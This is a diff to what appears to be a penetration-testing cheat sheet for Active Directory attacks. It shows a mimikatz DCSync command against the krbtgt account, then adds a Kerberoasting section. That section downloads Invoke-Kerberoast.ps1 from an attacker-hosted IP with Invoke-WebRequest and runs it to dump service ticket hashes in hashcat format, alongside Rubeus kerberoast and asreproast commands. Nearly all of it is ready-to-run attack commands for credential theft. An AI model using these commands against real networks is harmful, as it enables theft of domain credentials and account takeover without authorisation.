@@ -54,8 +54,15 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 lsadump::dcsync /user:krbtgt
 ```
 
-Kerberoast
+### Kerberoast
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
 ```
+Invoke-WebRequest -Uri 'http://10.6.86.172/Invoke-Kerberoast.ps1' -OutFile 'Invoke-Kerberoast.ps1'
+
+Invoke-Kerberoast -OutputFormat hashcat |fl
+Invoke-Kerberoast -OutputFormat hashcat | Select-Object Hash -ExpandProperty hash
+
+
 Rubeus.exe kerberoast
 Rubeus.exe asreproast
 
